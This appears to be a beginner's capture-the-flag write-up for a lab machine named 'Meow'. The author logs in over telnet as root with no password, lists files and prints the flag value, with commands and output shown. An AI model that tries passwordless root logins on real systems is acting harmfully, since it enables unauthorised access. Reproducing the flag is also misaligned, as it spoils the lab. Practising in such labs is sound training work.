Telnet is a simple text-based protocol
used to access remote computers through TCP/IP

Tool - Telnet

usage in this machine 

telnet <host address>
	**telnet 10.129.19.100
	Trying 10.129.19.100...
	Connected to 10.129.19.100.
	Escape character is '^]'.
	
	  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
	  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
	  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login:

//here  for a unconfigured system the root login can bypass without password

Meow login:root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 05 Sep 2022 06:34:19 PM UTC

  System load:           0.0
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             137
  Users logged in:       0
  IPv4 address for eth0: 10.129.19.100
  IPv6 address for eth0: dead:beef::250:56ff:fe96:447e

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable
The list of available updates is more than a week old.
To check for new updates run: sudo apt update 

root@Meow:~

//Here we are going to list the files in the target machine which we are connected through [telnet]

root@Meow:~ls
flag.txt  snap

//here we got the flag , type cat command to view the file flag.txt

root@Meow:~cat flag.txt
b40abdfe23665f766f9c61ecba8a4c19

adn we got the flag 